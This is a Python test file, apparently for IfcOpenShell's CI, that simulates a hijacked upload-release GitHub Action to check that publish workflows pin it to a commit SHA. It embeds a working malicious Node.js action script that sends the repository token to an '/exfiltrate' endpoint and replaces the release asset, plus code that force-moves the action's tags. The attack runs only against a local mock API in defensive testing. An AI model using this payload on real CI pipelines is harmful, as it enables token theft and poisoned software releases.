# This file was generated with the assistance of an AI coding tool.
"""Publish workflows must upload the built zip even after the action tag moves.

The publish workflows run ``svenstaro/upload-release-action`` and pass the job
token as ``repo_token``. actions/runner v2.338.2
(``ActionManifestManagerWrapper.ParseActionReference``) splits ``uses`` on the
last ``@`` and (``ActionManager.GetDownloadInfoAsync``) asks GitHub to resolve
that ref. The hosted-runner log for a job with no ``permissions`` block shows
the resolution of a tag::

    Download action repository 'svenstaro/upload-release-action@v2' (SHA:<commit>)

and ``GITHUB_TOKEN Permissions`` includes ``Contents: write``. The action at
that commit (``dist/index.js``, ``runs.main`` from ``action.yml``) reads
``INPUT_REPO_TOKEN`` and, when ``overwrite`` is true, deletes the existing
asset and uploads ``INPUT_FILE``.

``upload-release-action``'s versioning workflow moves ``tags/v2`` on every
release: Actions-R-Us/actions-tagger at ``330ddfac760021349fef7ff62b372f2f691c20fb``
calls ``git.updateRef`` with ``force: true`` for ``tags/v<major>``. These tests
do that ref update locally, then run whichever commit the workflow ref resolves
to, the way ``NodeScriptActionHandler`` runs ``action.yml``'s ``main`` script.
The release asset must still be the zip the workflow built.

A 40-hex ref is a commit id. Git 2.43.0 ignores a ref of that name and
``git rev-parse <sha>`` stays on that commit, so moving tags does not change
the script that receives the token.

Run:

    python3 -m pytest test/ci/test_floating_upload_release_action.py
"""

from __future__ import annotations

import json
import os
import re
import shutil
import subprocess
import threading
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path
from urllib.error import HTTPError
from urllib.parse import parse_qs, urlparse
from urllib.request import Request, urlopen

import pytest
import yaml

REPO_ROOT = Path(__file__).resolve().parents[2]
WORKFLOWS = REPO_ROOT / ".github" / "workflows"
ACTION = "svenstaro/upload-release-action"
ACTION_CLONE = "https://github.com/svenstaro/upload-release-action.git"
ACTION_API = "https://api.github.com/repos/svenstaro/upload-release-action/commits"
PUBLISHING_REPOSITORY = "IfcOpenShell/IfcOpenShell"
# Obvious placeholder. The real job token is secrets.GITHUB_TOKEN in each
# workflow's upload step; this file never contains that value.
TOKEN = "PLACEHOLDER_GITHUB_TOKEN"
FULL_SHA = re.compile(r"^[0-9a-f]{40}$")
BUILT_ZIP = b"bonsai-or-converter-build-artifact"
PREVIOUS_ZIP = b"previously-published-release-asset"
ATTACKER_ZIP = b"attacker-replaced-release-asset"
RELEASE_ENDPOINTS = re.compile(r"^/repos/IfcOpenShell/IfcOpenShell/releases(?:/|$)")


def _git(repo: Path, *args: str, check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        ["git", *args],
        cwd=repo,
        check=check,
        capture_output=True,
        text=True,
    )


def parse_action_uses(uses: str) -> tuple[str, str]:
    """Split ``owner/repo@ref`` the way the runner's ParseActionReference does."""
    at_index = uses.rfind("@")
    if at_index <= 0:
        raise AssertionError(f"action uses has no ref: {uses}")
    ref = uses[at_index + 1 :]
    repo_part = uses[:at_index]
    parts = repo_part.split("/")
    if len(parts) < 2:
        raise AssertionError(f"action uses has no owner/repo: {uses}")
    return f"{parts[0]}/{parts[1]}", ref


def upload_steps() -> list[dict]:
    found = []
    for path in sorted(WORKFLOWS.glob("*.yml")):
        document = yaml.safe_load(path.read_text()) or {}
        jobs = document.get("jobs") or {}
        for job_name, job in jobs.items():
            if not isinstance(job, dict):
                continue
            for index, step in enumerate(job.get("steps") or []):
                uses = step.get("uses")
                if not isinstance(uses, str) or not uses.startswith(f"{ACTION}@"):
                    continue
                name, ref = parse_action_uses(uses)
                found.append(
                    {
                        "id": f"{path.name}:{job_name}:{index}",
                        "workflow": path,
                        "job": job_name,
                        "uses": uses,
                        "name": name,
                        "ref": ref,
                        "with": step.get("with") or {},
                    }
                )
    return found


def _as_input(value: object, fallback: str) -> str:
    """Runner inputs are strings. Expressions are already evaluated by then."""
    if isinstance(value, bool):
        return "true" if value else "false"
    if value is None:
        return ""
    text = str(value)
    if "${{" in text:
        return fallback
    return text


def evaluated_inputs(step: dict, built_zip: Path) -> dict[str, str]:
    raw = step["with"]
    return {
        "repo_token": TOKEN,
        "file": str(built_zip),
        "asset_name": _as_input(raw.get("asset_name"), "published.zip"),
        "tag": _as_input(raw.get("tag"), "published-release"),
        "overwrite": _as_input(raw.get("overwrite"), "false"),
        "release_name": _as_input(raw.get("release_name"), "published-release"),
        "body": _as_input(raw.get("body"), ""),
        "file_glob": _as_input(raw.get("file_glob"), "false"),
        "draft": _as_input(raw.get("draft"), "false"),
        "prerelease": _as_input(raw.get("prerelease"), "false"),
        "make_latest": _as_input(raw.get("make_latest"), "true"),
        "promote": _as_input(raw.get("promote"), "false"),
        "check_duplicates": _as_input(raw.get("check_duplicates"), "true"),
        "target_commit": _as_input(raw.get("target_commit"), ""),
        "release_id": _as_input(raw.get("release_id"), ""),
        "repo_name": _as_input(raw.get("repo_name"), ""),
    }


def github_commit(ref: str) -> str:
    request = Request(
        f"{ACTION_API}/{ref}",
        headers={
            "Accept": "application/vnd.github+json",
            "User-Agent": "ifcopenshell-upload-action-pin-test",
        },
    )
    try:
        with urlopen(request, timeout=60) as response:
            payload = json.load(response)
    except HTTPError as exc:
        raise AssertionError(f"GitHub commits API failed for {ref}: {exc}") from exc
    sha = payload["sha"]
    if not FULL_SHA.fullmatch(sha):
        raise AssertionError(f"GitHub commits API returned a non-commit id for {ref}: {sha}")
    return sha


def resolve_ref(repo: Path, ref: str) -> str:
    """Resolve the ref the runner sends to ResolveActionDownloadInfo.

    A 40-hex string is the commit id (git 2.43.0 ignores a ref with that
    name). Anything else is a tag or branch, peeled to the commit it points
    at now.
    """
    if FULL_SHA.fullmatch(ref):
        completed = _git(repo, "rev-parse", "--verify", f"{ref}^{{commit}}")
        sha = completed.stdout.strip()
        if sha != ref:
            raise AssertionError(f"{ref} did not resolve to itself ({sha})")
        return sha
    tag = _git(repo, "show-ref", "--verify", "--quiet", f"refs/tags/{ref}", check=False)
    if tag.returncode == 0:
        spec = f"refs/tags/{ref}^{{commit}}"
    else:
        spec = f"refs/heads/{ref}^{{commit}}"
    completed = _git(repo, "rev-parse", "--verify", spec)
    return completed.stdout.strip()


def _write_attacker(repo: Path) -> str:
    script = r"""
import http from "http";
import https from "https";
import {URL} from "url";

const token = process.env.INPUT_REPO_TOKEN;
const tag = (process.env.INPUT_TAG || "").replace(/^refs\/tags\//, "").replace(/^refs\/heads\//, "");
const assetName = process.env.INPUT_ASSET_NAME || "replaced.zip";
const api = process.env.GITHUB_API_URL;
const repository = process.env.GITHUB_REPOSITORY || "";
const slash = repository.indexOf("/");
const owner = repository.slice(0, slash);
const repo = repository.slice(slash + 1);
const payload = Buffer.from("attacker-replaced-release-asset");

function request(method, url, body, contentType) {
  return new Promise((resolve, reject) => {
    const target = new URL(url);
    const lib = target.protocol === "https:" ? https : http;
    const headers = {
      Authorization: `token ${token}`,
      Accept: "application/vnd.github+json",
    };
    if (body) {
      headers["Content-Type"] = contentType;
      headers["Content-Length"] = Buffer.byteLength(body);
    }
    const req = lib.request(target, {method, headers}, (res) => {
      const chunks = [];
      res.on("data", (chunk) => chunks.push(chunk));
      res.on("end", () => resolve({status: res.statusCode, body: Buffer.concat(chunks)}));
    });
    req.on("error", reject);
    if (body) req.write(body);
    req.end();
  });
}

(async () => {
  await request("POST", `${api}/exfiltrate`, Buffer.from(token), "text/plain");
  const listed = await request("GET", `${api}/repos/${owner}/${repo}/releases/tags/${encodeURIComponent(tag)}`);
  let release;
  if (listed.status === 404) {
    const created = await request(
      "POST",
      `${api}/repos/${owner}/${repo}/releases`,
      Buffer.from(JSON.stringify({tag_name: tag, name: tag, body: ""})),
      "application/json"
    );
    release = JSON.parse(created.body.toString());
  } else {
    release = JSON.parse(listed.body.toString());
  }
  const assetsResponse = await request("GET", `${api}/repos/${owner}/${repo}/releases/${release.id}/assets`);
  const assets = JSON.parse(assetsResponse.body.toString() || "[]");
  for (const asset of assets) {
    if (asset.name === assetName) {
      await request("DELETE", `${api}/repos/${owner}/${repo}/releases/assets/${asset.id}`);
    }
  }
  const upload = release.upload_url.replace("{?name,label}", `?name=${encodeURIComponent(assetName)}`);
  await request("POST", upload, payload, "application/octet-stream");
})().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
"""
    action_yml = repo / "action.yml"
    manifest = yaml.safe_load(action_yml.read_text())
    manifest["runs"] = {"using": "node24", "main": "dist/index.js"}
    action_yml.write_text(yaml.safe_dump(manifest, sort_keys=False))
    script_path = repo / "dist" / "index.js"
    script_path.parent.mkdir(parents=True, exist_ok=True)
    script_path.write_text(script)
    _git(repo, "add", "action.yml", "dist/index.js")
    _git(
        repo,
        "-c",
        "user.email=attacker@example.com",
        "-c",
        "user.name=Attacker",
        "commit",
        "-m",
        "Point the release action tag at a replacement uploader",
    )
    return _git(repo, "rev-parse", "HEAD").stdout.strip()


def move_tag(repo: Path, ref: str, attacker: str) -> None:
    """Force-update the tag the workflow names, as actions-tagger does."""
    if FULL_SHA.fullmatch(ref):
        # The attacker can still move every tag, including a tag whose name is
        # the pinned sha. Git ignores a 40-hex ref name.
        for tag in _git(repo, "tag", "--list").stdout.split():
            _git(repo, "tag", "-f", tag, attacker)
        _git(repo, "tag", "-f", ref, attacker)
        return
    existing = _git(repo, "show-ref", "--verify", "--quiet", f"refs/heads/{ref}", check=False)
    if existing.returncode == 0:
        _git(repo, "update-ref", f"refs/heads/{ref}", attacker)
        return
    _git(repo, "tag", "-f", ref, attacker)


class _ReleaseApi:
    def __init__(self, tag: str, asset_name: str, release_name: str, body: str, overwrite_existing: bool):
        self.state = {"releases": {}, "assets": {}, "next_release": 1, "next_asset": 1, "requests": []}
        handler = self._make_handler()
        self.server = ThreadingHTTPServer(("127.0.0.1", 0), handler)
        self.port = self.server.server_address[1]
        if overwrite_existing:
            self._seed(tag, asset_name, release_name, body)
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()

    def _seed(self, tag: str, asset_name: str, release_name: str, body: str) -> None:
        release_id = self.state["next_release"]
        self.state["next_release"] += 1
        asset_id = self.state["next_asset"]
        self.state["next_asset"] += 1
        self.state["releases"][release_id] = {
            "id": release_id,
            "tag_name": tag,
            "name": release_name,
            "body": body,
            "draft": False,
            "prerelease": False,
            "upload_url": (
                f"http://127.0.0.1:{self.port}/repos/{PUBLISHING_REPOSITORY}/releases/{release_id}/assets{{?name,label}}"
            ),
        }
        self.state["assets"][asset_id] = {
            "id": asset_id,
            "name": asset_name,
            "release_id": release_id,
            "content": PREVIOUS_ZIP,
        }

    def close(self) -> None:
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)

    def asset_bytes(self, tag: str, asset_name: str) -> bytes | None:
        for release in self.state["releases"].values():
            if release["tag_name"] != tag:
                continue
            for asset in self.state["assets"].values():
                if asset["release_id"] == release["id"] and asset["name"] == asset_name:
                    return asset["content"]
        return None

    def _make_handler(self):
        state = self.state
        owner, repo = PUBLISHING_REPOSITORY.split("/")

        class Handler(BaseHTTPRequestHandler):
            def log_message(self, fmt: str, *args) -> None:
                return

            def _body(self) -> bytes:
                length = int(self.headers.get("Content-Length") or 0)
                return self.rfile.read(length) if length else b""

            def _authorized(self) -> bool:
                return self.headers.get("Authorization") == f"token {TOKEN}"

            def _json(self, status: int, payload: object) -> None:
                encoded = json.dumps(payload).encode()
                self.send_response(status)
                self.send_header("Content-Type", "application/json")
                self.send_header("Content-Length", str(len(encoded)))
                self.end_headers()
                self.wfile.write(encoded)

            def _record(self, body: bytes) -> None:
                state["requests"].append(
                    {
                        "method": self.command,
                        "path": self.path.split("?", 1)[0],
                        "query": self.path,
                        "authorized": self._authorized(),
                        "body": body,
                    }
                )

            def _release_from_tag(self, tag: str):
                for release in state["releases"].values():
                    if release["tag_name"] == tag:
                        return release
                return None

            def do_GET(self) -> None:
                self._record(b"")
                if not self._authorized():
                    self._json(401, {"message": "unauthorized"})
                    return
                parts = urlparse(self.path).path.strip("/").split("/")
                if (
                    parts[:3] == ["repos", owner, repo]
                    and len(parts) >= 5
                    and parts[3] == "releases"
                    and parts[4] == "tags"
                ):
                    tag = "/".join(parts[5:])
                    release = self._release_from_tag(tag)
                    if release is None:
                        self._json(404, {"message": "not found"})
                        return
                    self._json(200, release)
                    return
                if (
                    parts[:3] == ["repos", owner, repo]
                    and len(parts) == 6
                    and parts[3] == "releases"
                    and parts[5] == "assets"
                ):
                    release_id = int(parts[4])
                    assets = [
                        {"id": asset["id"], "name": asset["name"], "release_id": asset["release_id"]}
                        for asset in state["assets"].values()
                        if asset["release_id"] == release_id
                    ]
                    self._json(200, assets)
                    return
                if parts[:3] == ["repos", owner, repo] and len(parts) == 5 and parts[3] == "releases":
                    release = state["releases"].get(int(parts[4]))
                    if release is None:
                        self._json(404, {"message": "not found"})
                        return
                    self._json(200, release)
                    return
                self._json(404, {"message": "no route"})

            def do_POST(self) -> None:
                body = self._body()
                self._record(body)
                if not self._authorized():
                    self._json(401, {"message": "unauthorized"})
                    return
                parts = urlparse(self.path).path.strip("/").split("/")
                if parts[:4] == ["repos", owner, repo, "releases"] and parts[-1] == "releases":
                    payload = json.loads(body.decode() or "{}")
                    release_id = state["next_release"]
                    state["next_release"] += 1
                    release = {
                        "id": release_id,
                        "tag_name": payload.get("tag_name"),
                        "name": payload.get("name") or payload.get("tag_name"),
                        "body": payload.get("body") or "",
                        "draft": bool(payload.get("draft")),
                        "prerelease": bool(payload.get("prerelease")),
                        "upload_url": (
                            f"http://127.0.0.1:{self.server.server_address[1]}/repos/{owner}/{repo}/releases/"
                            f"{release_id}/assets{{?name,label}}"
                        ),
                    }
                    state["releases"][release_id] = release
                    self._json(201, release)
                    return
                if "assets" in parts and parts[:3] == ["repos", owner, repo]:
                    name = parse_qs(urlparse(self.path).query).get("name", ["asset"])[0]
                    release_id = int(parts[parts.index("releases") + 1])
                    asset_id = state["next_asset"]
                    state["next_asset"] += 1
                    state["assets"][asset_id] = {
                        "id": asset_id,
                        "name": name,
                        "release_id": release_id,
                        "content": body,
                    }
                    self._json(
                        201,
                        {
                            "id": asset_id,
                            "name": name,
                            "browser_download_url": f"http://127.0.0.1:{self.server.server_address[1]}/download/{asset_id}",
                        },
                    )
                    return
                self._json(404, {"message": "no route"})

            def do_PATCH(self) -> None:
                body = self._body()
                self._record(body)
                if not self._authorized():
                    self._json(401, {"message": "unauthorized"})
                    return
                parts = urlparse(self.path).path.strip("/").split("/")
                release = state["releases"].get(int(parts[4]))
                if release is None:
                    self._json(404, {"message": "not found"})
                    return
                payload = json.loads(body.decode() or "{}")
                for key in ("name", "body", "draft", "prerelease"):
                    if key in payload:
                        release[key] = payload[key]
                self._json(200, release)

            def do_DELETE(self) -> None:
                self._record(b"")
                if not self._authorized():
                    self._json(401, {"message": "unauthorized"})
                    return
                parts = urlparse(self.path).path.strip("/").split("/")
                state["assets"].pop(int(parts[-1]), None)
                self.send_response(204)
                self.end_headers()

        return Handler


def run_resolved_action(
    repo: Path, sha: str, inputs: dict[str, str], api: _ReleaseApi
) -> subprocess.CompletedProcess[str]:
    _git(repo, "checkout", "--detach", sha)
    manifest_path = repo / "action.yml"
    if not manifest_path.is_file():
        manifest_path = repo / "action.yaml"
    manifest = yaml.safe_load(manifest_path.read_text())
    runs = manifest.get("runs") or {}
    using = str(runs.get("using") or "")
    if using not in {"node12", "node16", "node20", "node24"}:
        raise AssertionError(f"{sha} action.yml runs.using is {using!r}, expected a node action")
    script = repo / str(runs["main"])
    if not script.is_file():
        raise AssertionError(f"{sha} is missing {runs['main']}")
    env = os.environ.copy()
    for key in ("http_proxy", "https_proxy", "all_proxy", "HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY"):
        env.pop(key, None)
    env.update(
        {
            "GITHUB_API_URL": f"http://127.0.0.1:{api.port}",
            "GITHUB_SERVER_URL": "https://github.com",
            "GITHUB_REPOSITORY": PUBLISHING_REPOSITORY,
            "GITHUB_ACTION": "upload-release",
        }
    )
    for key, value in inputs.items():
        env[f"INPUT_{key.upper()}"] = value
    return subprocess.run(
        ["node", str(script)],
        cwd=repo,
        env=env,
        capture_output=True,
        text=True,
        timeout=60,
        check=False,
    )


@pytest.fixture(scope="session")
def action_origin(tmp_path_factory: pytest.TempPathFactory) -> Path:
    dest = tmp_path_factory.mktemp("upload-release-action")
    subprocess.run(
        ["git", "clone", "--depth", "1", "--branch", "v2", ACTION_CLONE, str(dest)],
        check=True,
        capture_output=True,
        text=True,
    )
    local_v2 = resolve_ref(dest, "v2")
    remote_v2 = github_commit("v2")
    if local_v2 != remote_v2:
        raise AssertionError(f"local tag v2 is {local_v2}, GitHub resolves v2 to {remote_v2}")
    # The same commit GitHub's commits API returns for the full sha.
    if github_commit(local_v2) != local_v2:
        raise AssertionError(f"GitHub did not resolve {local_v2} to itself")
    return dest


STEPS = upload_steps()


@pytest.mark.parametrize("step", STEPS, ids=[step["id"] for step in STEPS])
def test_moved_action_tag_cannot_replace_release_asset(step: dict, action_origin: Path, tmp_path: Path) -> None:
    """The zip users download stays the file this workflow built."""
    assert step["name"] == ACTION
    repo = tmp_path / "action"
    shutil.copytree(action_origin, repo, symlinks=True)
    # copytree of a git clone keeps the objects. Re-resolve before the attacker moves anything.
    before = resolve_ref(repo, step["ref"]) if not FULL_SHA.fullmatch(step["ref"]) else step["ref"]
    if FULL_SHA.fullmatch(step["ref"]):
        fetched = subprocess.run(
            ["git", "fetch", "--depth", "1", "origin", step["ref"]],
            cwd=repo,
            capture_output=True,
            text=True,
            check=False,
        )
        if fetched.returncode != 0:
            raise AssertionError(f"could not fetch pinned action commit {step['ref']}: {fetched.stderr}")
        before = resolve_ref(repo, step["ref"])

    attacker = _write_attacker(repo)
    move_tag(repo, step["ref"], attacker)
    resolved = resolve_ref(repo, step["ref"])

    built_zip = tmp_path / "built.zip"
    built_zip.write_bytes(BUILT_ZIP)
    inputs = evaluated_inputs(step, built_zip)
    api = _ReleaseApi(
        tag=inputs["tag"],
        asset_name=inputs["asset_name"],
        release_name=inputs["release_name"],
        body=inputs["body"],
        overwrite_existing=inputs["overwrite"] == "true",
    )
    try:
        completed = run_resolved_action(repo, resolved, inputs, api)
    finally:
        api.close()

    published = api.asset_bytes(inputs["tag"], inputs["asset_name"])
    outside = [item["path"] for item in api.state["requests"] if not RELEASE_ENDPOINTS.match(item["path"])]
    assert published == BUILT_ZIP and not outside, (
        f"{step['workflow'].relative_to(REPO_ROOT)} job {step['job']} uses {step['uses']}. "
        f"Before the tag move that ref was {before}; after it, the runner resolves {resolved}, "
        f"which received {TOKEN!r} as INPUT_REPO_TOKEN. "
        f"The release asset is {published!r}, not the built zip {BUILT_ZIP!r}. "
        f"Requests outside the releases API: {outside}. "
        f"node exit {completed.returncode}. stdout: {completed.stdout[-1500:]!r} stderr: {completed.stderr[-1500:]!r}"
    )


def test_publish_workflows_invoke_the_upload_action() -> None:
    assert STEPS, "expected publish workflows to run svenstaro/upload-release-action"
